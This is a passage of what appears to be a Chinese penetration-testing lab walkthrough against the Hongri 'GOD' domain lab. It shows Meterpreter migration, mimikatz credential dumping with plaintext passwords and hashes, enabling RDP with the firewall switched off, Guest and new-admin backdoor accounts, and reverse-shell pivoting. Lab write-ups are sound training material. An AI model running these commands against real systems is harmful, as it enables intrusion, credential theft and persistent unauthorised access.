<span class="line"> <span class="token number">1576</span>  <span class="token number">508</span>   vmtoolsd.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>VMware<span class="token punctuation">\\</span>VMware Tools<span class="token punctuation">\\</span>vmtoolsd.exe</span>
<span class="line"> <span class="token number">1756</span>  <span class="token number">508</span>   SearchIndexer.exe  x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>SearchIndexer.exe</span>
<span class="line"> <span class="token number">1836</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">1896</span>  <span class="token number">508</span>   taskhost.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>taskhost.exe</span>
<span class="line"> <span class="token number">1920</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">1948</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>NETWORK SERVICE  C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">1976</span>  <span class="token number">2116</span>  httpd.exe          x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>Apache<span class="token punctuation">\\</span>bin<span class="token punctuation">\\</span>httpd.exe</span>
<span class="line"> <span class="token number">2052</span>  <span class="token number">1212</span>  vmtoolsd.exe       x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>VMware<span class="token punctuation">\\</span>VMware Tools<span class="token punctuation">\\</span>vmtoolsd.exe</span>
<span class="line"> <span class="token number">2068</span>  <span class="token number">1212</span>  openvpn-gui.exe    x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>OpenVPN<span class="token punctuation">\\</span>bin<span class="token punctuation">\\</span>openvpn-gui.exe</span>
<span class="line"> <span class="token number">2116</span>  <span class="token number">1212</span>  phpStudy.exe       x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>phpStudy.exe</span>
<span class="line"> <span class="token number">2124</span>  <span class="token number">1212</span>  cmd.exe            x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>cmd.exe</span>
<span class="line"> <span class="token number">2180</span>  <span class="token number">1976</span>  httpd.exe          x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>phpStudy<span class="token punctuation">\\</span>Apache<span class="token punctuation">\\</span>bin<span class="token punctuation">\\</span>httpd.exe</span>
<span class="line"> <span class="token number">2396</span>  <span class="token number">2708</span>  cmd.exe            x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>SysWOW64<span class="token punctuation">\\</span>cmd.exe</span>
<span class="line"> <span class="token number">2432</span>  <span class="token number">508</span>   taskhost.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>LOCAL SERVICE    C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>taskhost.exe</span>
<span class="line"> <span class="token number">2448</span>  <span class="token number">508</span>   wmpnetwk.exe       x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>NETWORK SERVICE  C:<span class="token punctuation">\\</span>Program Files<span class="token punctuation">\\</span>Windows Media Player<span class="token punctuation">\\</span>wmpnetwk.exe</span>
<span class="line"> <span class="token number">2496</span>  <span class="token number">508</span>   svchost.exe        x64   <span class="token number">0</span>        NT AUTHORITY<span class="token punctuation">\\</span>SYSTEM           C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>svchost.exe</span>
<span class="line"> <span class="token number">2540</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>conhost.exe</span>
<span class="line"> <span class="token number">2620</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>conhost.exe</span>
<span class="line"> <span class="token number">2684</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>conhost.exe</span>
<span class="line"> <span class="token number">2708</span>  <span class="token number">2180</span>  cmd.exe            x86   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>SysWOW64<span class="token punctuation">\\</span>cmd.exe</span>
<span class="line"> <span class="token number">2884</span>  <span class="token number">404</span>   conhost.exe        x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>system32<span class="token punctuation">\\</span>conhost.exe</span>
<span class="line"> <span class="token number">2984</span>  <span class="token number">2396</span>  houmen.exe         x64   <span class="token number">1</span>        GOD<span class="token punctuation">\\</span>Administrator             c:<span class="token punctuation">\\</span>houmen.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; migrate 512</span>
<span class="line">[*] Migrating from 2984 to 512...</span>
<span class="line">[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; migrate 524</span>
<span class="line">[*] Migrating from 2984 to 524...</span>
<span class="line">[*] Migration completed successfully.</span>
<span class="line">meterpreter &gt; load kiwi</span>
<span class="line">Loading extension kiwi...</span>
<span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span>
<span class="line"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span>
<span class="line"> ## / \\ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )</span>
<span class="line"> ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
<span class="line"> &#39;## v ##&#39;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span>
<span class="line">  &#39;#####&#39;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span>
<span class="line"></span>
<span class="line">Success.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; creds_all</span>
<span class="line">[+] Running as SYSTEM</span>
<span class="line">[*] Retrieving all credentials</span>
<span class="line">msv credentials</span>
<span class="line">===============</span>
<span class="line"></span>
<span class="line">Username       Domain  LM                                NTLM                              SHA1</span>
<span class="line">--------       ------  --                                ----                              ----</span>
<span class="line">Administrator  GOD     3cfb20151e7ae02cccf9155e3e7db453  1db9f782898fc137280b588fac868e0b  865b2f37e68a3b8c5af37a0d8c44f95aeb023d9</span>
<span class="line">                                                                                           8</span>
<span class="line">STU1$          GOD                                       f9409788cf55512badac576c9f15ee6d  57d56580669e86b1b07f423540160a275f1bf2f</span>
<span class="line">                                                                                           8</span>
<span class="line"></span>
<span class="line">wdigest credentials</span>
<span class="line">===================</span>
<span class="line"></span>
<span class="line">Username       Domain  Password</span>
<span class="line">--------       ------  --------</span>
<span class="line">(null)         (null)  (null)</span>
<span class="line">Administrator  GOD     hongrisec@2019</span>
<span class="line">STU1$          GOD     41 bf 55 f8 6e c5 9e 7d 27 6e ea 1e 29 be 7e 99 df 0d b0 bc 39 8b 3a 2a 1f 09 e2 ab 6c 83 f2 28 68 7f b3 57</span>
<span class="line">                        a9 e4 e4 8d 5f 2c 3c 7d 88 dd 52 a9 b4 26 ea 9f 46 74 b2 1d 15 45 81 e0 ea 25 fa a8 ef e5 cd 3f 0d 35 44 b</span>
<span class="line">                       1 af 9c d8 8e e1 31 28 a2 02 1d 2d 5b 3c 01 d2 35 13 8b ff 4f 46 da 4f b7 d5 d4 e6 6b 08 20 c9 4f 46 83 28</span>
<span class="line">                       cc e8 4b cb f3 60 0f fd 7c 1e 1e 2f 1f bb 8a dc f8 5b be d8 b4 d0 cd f9 02 e1 c0 56 23 c7 2d c2 69 76 70 94</span>
<span class="line">                        b5 cb d5 c2 90 98 52 59 1b d5 2a bd bc 08 b0 56 45 69 c3 33 33 4d 00 60 3c 8c 41 b9 c9 00 ef 75 ac 3c 2d 8</span>
<span class="line">                       f cc 4b 90 4a a6 08 e5 4d eb 0a f7 32 d9 81 2e 62 aa 68 65 fd e6 d2 a4 b0 4a 52 fd 63 4f 8b 33 bc 69 65 33</span>
<span class="line">                       a4 c7 3f 4a 37 a5 ce ea ed b5 07 bc 2a 4f b4 4f 3b c0 ca b8 34 d2 1b 47 f7 f9</span>
<span class="line"></span>
<span class="line">tspkg credentials</span>
<span class="line">=================</span>
<span class="line"></span>
<span class="line">Username       Domain  Password</span>
<span class="line">--------       ------  --------</span>
<span class="line">Administrator  GOD     hongrisec@2019</span>
<span class="line"></span>
<span class="line">kerberos credentials</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line">Username       Domain   Password</span>
<span class="line">--------       ------   --------</span>
<span class="line">(null)         (null)   (null)</span>
<span class="line">Administrator  GOD.ORG  hongrisec@2019</span>
<span class="line">stu1$          GOD.ORG  41 bf 55 f8 6e c5 9e 7d 27 6e ea 1e 29 be 7e 99 df 0d b0 bc 39 8b 3a 2a 1f 09 e2 ab 6c 83 f2 28 68 7f b3 5</span>
<span class="line">                        7 a9 e4 e4 8d 5f 2c 3c 7d 88 dd 52 a9 b4 26 ea 9f 46 74 b2 1d 15 45 81 e0 ea 25 fa a8 ef e5 cd 3f 0d 35 44</span>
<span class="line">                         b1 af 9c d8 8e e1 31 28 a2 02 1d 2d 5b 3c 01 d2 35 13 8b ff 4f 46 da 4f b7 d5 d4 e6 6b 08 20 c9 4f 46 83</span>
<span class="line">                        28 cc e8 4b cb f3 60 0f fd 7c 1e 1e 2f 1f bb 8a dc f8 5b be d8 b4 d0 cd f9 02 e1 c0 56 23 c7 2d c2 69 76 7</span>
<span class="line">                        0 94 b5 cb d5 c2 90 98 52 59 1b d5 2a bd bc 08 b0 56 45 69 c3 33 33 4d 00 60 3c 8c 41 b9 c9 00 ef 75 ac 3c</span>
<span class="line">                         2d 8f cc 4b 90 4a a6 08 e5 4d eb 0a f7 32 d9 81 2e 62 aa 68 65 fd e6 d2 a4 b0 4a 52 fd 63 4f 8b 33 bc 69</span>
<span class="line">                        65 33 a4 c7 3f 4a 37 a5 ce ea ed b5 07 bc 2a 4f b4 4f 3b c0 ca b8 34 d2 1b 47 f7 f9</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>可得密码：hongrisec@2019</p></blockquote><h4 id="法二-cs" tabindex="-1"><a class="header-anchor" href="#法二-cs"><span>法二：CS</span></a></h4><p><img src="`+X+`" alt="image-20220814170532122"></p><p>然后再点击&quot;抓取明文密码&quot;即可。</p><h3 id="启用远程桌面" tabindex="-1"><a class="header-anchor" href="#启用远程桌面"><span>启用远程桌面</span></a></h3><h4 id="法一-cmd" tabindex="-1"><a class="header-anchor" href="#法一-cmd"><span>法一：CMD</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token function">netstat</span> <span class="token parameter variable">-ano</span> <span class="token operator">|</span> findstr <span class="token string">&quot;3389&quot;</span>						<span class="token comment"># 查看端口3389是否开启</span></span>
<span class="line">REG query HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>Terminal<span class="token string">&quot; &quot;</span>Server<span class="token punctuation">\\</span>WinStations<span class="token punctuation">\\</span>RDP-Tcp /v PortNumber		<span class="token comment"># 查看远程端口</span></span>
<span class="line">REG ADD HKLM<span class="token punctuation">\\</span>SYSTEM<span class="token punctuation">\\</span>CurrentControlSet<span class="token punctuation">\\</span>Control<span class="token punctuation">\\</span>Terminal<span class="token string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f	<span class="token comment"># 开启3389端口</span></span>
<span class="line">netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;Remote Desktop&quot;</span> <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3389</span> <span class="token assign-left variable">action</span><span class="token operator">=</span>allow	<span class="token comment"># 允许 3389 端口放行</span></span>
<span class="line">netsh firewall <span class="token builtin class-name">set</span> opmode disable					<span class="token comment"># Windows Server 2003 系统及之前版本</span></span>
<span class="line">netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off			<span class="token comment"># Windows Server 2003 之后系统版本</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+Z+`" alt=""></p><h4 id="法二-vmic-推荐" tabindex="-1"><a class="header-anchor" href="#法二-vmic-推荐"><span>法二：VMIC (推荐)</span></a></h4><blockquote><p>该方法会自动开启系统远程桌面中的允许远程连接到此计算机并启动默认的3389端口</p></blockquote><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+Q+`" alt="image-20220814194107916"></p><h4 id="法三-msf" tabindex="-1"><a class="header-anchor" href="#法三-msf"><span>法三：MSF</span></a></h4><h5 id="meterpretr-enable-rdp模块" tabindex="-1"><a class="header-anchor" href="#meterpretr-enable-rdp模块"><span><strong>Meterpretr enable_rdp模块</strong></span></a></h5><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">run post/windows/manage/enable_rdp </span>
<span class="line">run multi_console_command -r &lt;FileLocation&gt;				（文件为启用模块后的给的路径，都在/root/.msf4/loot/目录下）</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run post/windows/manage/enable_rdp </span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Enabling Remote Desktop</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     RDP is already enabled</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting Terminal Services <span class="token function">service</span> startup mode</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     The Terminal Services <span class="token function">service</span> is not <span class="token builtin class-name">set</span> to auto, changing it to auto <span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Opening port <span class="token keyword">in</span> <span class="token builtin class-name">local</span> firewall <span class="token keyword">if</span> necessary</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> For cleanup execute Meterpreter resource file: /root/.msf4/loot/20220814082551_default_192.168.220.138_host.windows.cle_346748.txt</span>
<span class="line">meterpreter <span class="token operator">&gt;</span> </span>
<span class="line">meterpreter <span class="token operator">&gt;</span> run multi_console_command <span class="token parameter variable">-r</span> /root/.msf4/loot/20220814082551_default_192.168.220.138_host.windows.cle_346748.txt</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running Command List <span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute <span class="token parameter variable">-H</span> <span class="token parameter variable">-f</span> cmd.exe <span class="token parameter variable">-a</span> <span class="token string">&quot;/c sc config termservice start= disabled&quot;</span></span>
<span class="line">Process <span class="token number">3008</span> created.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute <span class="token parameter variable">-H</span> <span class="token parameter variable">-f</span> cmd.exe <span class="token parameter variable">-a</span> <span class="token string">&quot;/c sc stop termservice&quot;</span></span>
<span class="line">Process <span class="token number">2848</span> created.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span>     Running <span class="token builtin class-name">command</span> execute <span class="token parameter variable">-H</span> <span class="token parameter variable">-f</span> cmd.exe <span class="token parameter variable">-a</span> <span class="token string">&quot;/c &#39;netsh firewall set service type = remotedesktop mode = enable&#39;&quot;</span></span>
<span class="line">Process <span class="token number">1416</span> created.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="getgui模块-略" tabindex="-1"><a class="header-anchor" href="#getgui模块-略"><span>GetGUI模块 (略)</span></a></h5><h4 id="远程登录" tabindex="-1"><a class="header-anchor" href="#远程登录"><span>远程登录</span></a></h4><p>在MSF里死活登不进</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">msf6 exploit(multi/handler) &gt; rdesktop 192.168.220.138</span>
<span class="line">[*] exec: rdesktop 192.168.220.138</span>
<span class="line"></span>
<span class="line">Core(warning): Certificate received from server is NOT trusted by this sspecific certificate.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也确认了上面对Win7的配置没有出错</p><p><img src="`+J+'" alt="image-20220814225454974"></p><p>网上搜了一下，发现 rdesktop 不适用于 WinXP/2003+ (不含XP/2003)</p><p><img src="'+$+'" alt="image-20220814225701766"></p><p>试一下用Win10的RD Client，成功连接，说明确实是 rdsektop 的问题</p><blockquote><p>当然，也可以用Linux上的Remmina</p></blockquote><p><img src="'+ss+`" alt="image-20220814225917789"></p><h2 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持"><span>权限维持</span></a></h2><h3 id="guest后门" tabindex="-1"><a class="header-anchor" href="#guest后门"><span>Guest后门</span></a></h3><blockquote><p>注：应加上域标签，如果完全复制此种方式，只是添加到STU1域</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">shell net user									 <span class="token comment"># 查看本机用户</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="`+ns+`" alt="image-20220814232334204"></p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">net user guest /active:yes						 <span class="token comment"># 激活guest</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">shell net user guest Aa123456					 <span class="token comment"># 给Guest用户设置密码</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">shell net localgroup administrators guest /add    <span class="token comment"># 将guest加入到管理员中</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="添加新用户后门" tabindex="-1"><a class="header-anchor" href="#添加新用户后门"><span>添加新用户后门</span></a></h3><blockquote><p>注：应加上域标签，如果按照上面Guest后门的方式，只是添加到STU1域里</p></blockquote><p><img src="`+as+'" alt="image-20220815002522071"></p><p><img src="'+es+'" alt="image-20220815002532623"></p><p>然后用RD Client连接即可</p><h3 id="尴尬之处" tabindex="-1"><a class="header-anchor" href="#尴尬之处"><span>尴尬之处</span></a></h3><p>两边登录都会互踢</p><blockquote><p>还可以采用其它权限维持的方法，比如shift后门、注册表后门、计划后门、白银黄金票据等</p></blockquote><p><img src="'+ps+`" alt="image-20220815002731903"></p><h2 id="横向探测" tabindex="-1"><a class="header-anchor" href="#横向探测"><span>横向探测</span></a></h2><h3 id="法一-msf-这里也写了proxychains" tabindex="-1"><a class="header-anchor" href="#法一-msf-这里也写了proxychains"><span>法一：MSF (*这里也写了ProxyChains)</span></a></h3><blockquote><p>可跳转至前面的 内网渗透，内容近似。</p></blockquote><p>先拿一个msf shell</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> use exploit/multi/handler </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload windows/x64/meterpreter/reverse_tcp</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&#39;&#39;</span>, seh, thread, process, none<span class="token punctuation">)</span></span>
<span class="line">   LHOST     <span class="token number">192.168</span>.220.137  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT     <span class="token number">9999</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.220.138</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:6500 <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-14 <span class="token number">12</span>:45:28 <span class="token parameter variable">-0400</span></span>
<span class="line"></span>
<span class="line">meterpreter <span class="token operator">&gt;</span> </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加路由</p><blockquote><p>手工添加：run autoroute -s 192.168.21.0/24 #添加路由 run autoroute -p #查看路由 自动添加：run post/multi/manage/autoroute</p></blockquote><blockquote><p>查看路由表：run autoroute -p</p></blockquote><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span>
<span class="line"></span>
<span class="line">[!] SESSION may not be compatible with this module:</span>
<span class="line">[!]  * incompatible session platform: windows</span>
<span class="line">[*] Running module against STU1</span>
<span class="line">[*] Searching for subnets to autoroute.</span>
<span class="line">[+] Route added to subnet 169.254.0.0/255.255.0.0 from host&#39;s routing table.</span>
<span class="line">[+] Route added to subnet 192.168.52.0/255.255.255.0 from host&#39;s routing table.</span>
<span class="line">[+] Route added to subnet 192.168.220.0/255.255.255.0 from host&#39;s routing table.</span>
<span class="line">meterpreter &gt; run autoroute -p</span>
<span class="line"></span>
<span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
